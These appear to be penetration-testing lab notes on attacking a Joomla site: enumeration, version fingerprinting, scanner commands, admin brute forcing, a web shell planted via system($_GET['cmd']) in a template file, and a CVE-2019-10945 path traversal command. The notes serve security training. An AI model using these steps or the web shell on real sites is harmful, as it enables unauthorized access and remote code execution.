**Admin Url**: `http://dev.inlanefreight.local/administrator`
**Vuln Count**: `485 vulnerabilities found`

### Enumeration

**Check Install**

`[!bash!]$ curl -s http://dev.inlanefreight.local/ | grep Joomla`

**Robots.txt**
```
# If the Joomla site is installed within a folder# eg www.example.com/joomla/ then the robots.txt file# MUST be moved to the site root# eg www.example.com/robots.txt# AND the joomla folder name MUST be prefixed to all of the# paths.# eg the Disallow rule for the /administrator/ folder MUST# be changed to read# Disallow: /joomla/administrator/#
# For more information about the robots.txt standard, see:# https://www.robotstxt.org/orig.htmlUser-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

**Version Fingerprinting**

`[!bash!]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5`

`[!bash!]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -`

**Automated Scanners**

```
[!bash!]**$** droopescan scan joomla --url http://dev.inlanefreight.local/

[!bash!]**$** python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

**Brute Forcing**

**Default user**: `admin`

`[!bash!]$ sudo joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin`

### Attacking

**Code Execution**

`Configuration`> `Templates` > `eg:protostar` > `Templates: Customise` > `error.php` > `system($_GET['cmd']);`

`[!bash!]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=id`

**CVE-2019-10945**

- Path Traversal
- https://www.exploit-db.com/exploits/46710
- `[!bash!]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /`
